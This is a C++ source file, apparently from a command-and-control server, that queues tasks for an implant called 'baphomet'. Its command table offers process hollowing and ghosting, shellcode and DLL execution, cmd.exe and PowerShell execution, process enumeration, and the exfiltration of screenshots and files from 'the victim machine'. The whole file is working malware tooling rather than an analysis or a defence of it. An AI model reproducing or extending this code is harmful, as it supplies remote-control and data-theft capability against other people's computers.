//
// Created by diago on 2024-04-25.
//

#include "baphomet.hpp"
#include "../../components/instance.hpp"


lurch::result<std::string>
lurch::baphomet::runexe(const command &cmd) {

    const auto [file_name, hollow, ghost] =
    cmd.get<std::string>("--staged-file", "-sf")
        .with<empty>("--hollow", "-h")
        .with<empty>("--ghost", "-g")
        .done();

    std::string type;
    if((hollow && ghost) || (!hollow && !ghost) ) {
        return error("Please specify either hollowing or ghosting.");
    }

    if(file_name->find_first_of('.') == std::string::npos) {
        return error("invalid file name.");
    }

    hollow
        .and_then([&](empty exists) {
            type = "hollow";
            return std::optional(exists);
        })
        .or_else([&] {
           type = "ghost";
            return std::optional<empty>(std::nullopt);
        });

    return delimit_command({"runexe", file_name.value(), type})
        .and_then([&](std::string task_string) {
            tasks.push(task_string);
            return result<std::string>("queued executable to be ran:" + file_name.value());
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}


lurch::result<std::string>
lurch::baphomet::cd(const command &cmd) {

    return delimit_command({
        cmd.name,
        std::get<0>(cmd.get<std::string>("--directory", "-d").done()).value()
    })
    .and_then([&](std::string task_str) {
        tasks.push(task_str);
        return result<std::string>("successfully queued a directory change.");
    })
    .or_else([&](std::string err) {
        return result<std::string>(error(err));
    });
}


lurch::result<std::string>
lurch::baphomet::cat(const command &cmd) {

    return delimit_command({
        cmd.name,
        std::get<0>(cmd.get<std::string>("--file-name", "-f").done()).value()
    })
    .and_then([&](std::string task_str) {
        tasks.push(task_str);
        return result<std::string>("successfully queued cat.");
    })
    .or_else([&](std::string err) {
        return result<std::string>(error(err));
    });
}


lurch::result<std::string>
lurch::baphomet::print_tasks() const {

    //
    // std::queue does not have iterators.
    // we need to create a copy and pop each element one by one.
    //

    std::queue copy_queue(tasks);
    std::string buff;

    while(!copy_queue.empty()) {
        buff += copy_queue.front() + '\n';
        copy_queue.pop();
    }

    if(buff.empty()) {
        return error("no tasks available.");
    }

    return { buff };
}


lurch::result<std::string>
lurch::baphomet::get_task() {
    if(tasks.empty()) {
        return error("no tasks available.");
    }

    return tasks.front();
}


lurch::result<std::string>
lurch::baphomet::complete_task(const command &cmd) {
    if(tasks.empty()) {
        return error("no tasks to be completed.");
    }

    tasks.pop();
    return { "popped top task." };
}


lurch::result<std::string>
lurch::baphomet::delimit_command(const std::vector<std::string> &strings) {

    std::string buff;
    for(const auto& str : strings) {
        if(str.find_first_of(AGENT_DELIMITING_CHAR) != std::string::npos) {
            return error("couldn't format command, invalid character used.");
        }

        buff += str + AGENT_DELIMITING_CHAR;
    }

    if(!buff.empty() && buff.back() == '!') {
        buff.pop_back();
    }

    return { buff };
}


lurch::result<std::filesystem::path>
lurch::baphomet::upload(const std::string &file, const std::string &extension) {
    return inst->db.fileman_create(file, extension, id, true);
}


lurch::result<std::string>
lurch::baphomet::recieve(const command &cmd) {

    static accepted_commands commands;

    if(!commands.ready()) {

        commands.add_command("pwd", "prints the working directory of the implant");
        commands.add_command("ls", "displays files in the working directory");
        commands.add_command("procenum", "enumerates all running processes on the victim machine");
        commands.add_command("screenshot", "takes a screenshot and exfiltrates it");
        commands.add_command("whoami", "gets whoami.exe info without starting a shell process");
        commands.add_command("get_task", "used by the agent to retrieve a task.");
        commands.add_command("tasks", "display all existing tasks.");
        commands.add_command("help", "display this help message and exit.");

        commands.add_command("cd", "changes the working directory")
            .arg<std::string>("--directory", "-d", true);

        commands.add_command("cat", "displays file contents")
            .arg<std::string>("--file-name", "-f", true);

        commands.add_command("mkdir", "creates a directory")
            .arg<std::string>("--directory-name", "-d", true);

        commands.add_command("rm", "removes a directory or file")
            .arg<std::string>("--directory-entry", "-de", true);

        commands.add_command("cp", "copies a file to a specified location")
            .arg<std::string>("--source", "-s", true)
            .arg<std::string>("--destination", "-d", true);

        commands.add_command("ps", "executes a powershell command and returns the output")
            .arg<std::string>("--command", "-c", true);

        commands.add_command("cmd", "executes a shell command (cmd.exe) and returns the output")
            .arg<std::string>("--command", "-c", true);

        commands.add_command("upload", "exfiltrates a file")
            .arg<std::string>("--directory-entry", "-de", true);

        commands.add_command("runexe", "runs an executable file on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true)
            .arg<empty>("--hollow", "-h", false)
            .arg<empty>("--ghost", "-g", false);

        commands.add_command("rundll", "runs a DLL on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true);

        commands.add_command("runshellcode", "loads shellcode into memory and executes it")
            .arg<std::string>("--staged-file", "-sf", true);

        commands.add_command("complete_task", "used by the agent to complete a task.")
            .arg<std::string>("--result", "-r", true);

        commands.done();
    }

    if(!commands.matches(cmd)) {
        return error("invalid command or argument");
    }

    if(cmd == "runexe") {
        return runexe(cmd);
    }

    if(cmd == "cat") {
        return cat(cmd);
    }

    if(cmd == "tasks") {
        return print_tasks();
    }

    if(cmd == "help") {
        return commands.help();
    }

    if(cmd == "get_task") {
        return { get_task() };
    }

    if(cmd == "complete_task") {
        return complete_task(cmd);
    }

    //
    // ensure this is last please
    //
    if(cmd.arguments.empty()) {
        tasks.push(cmd.name);
        return {"successfully pushed task " + cmd.name};
    }


    return OBJECT_EMPTY_RESPONSE;
}

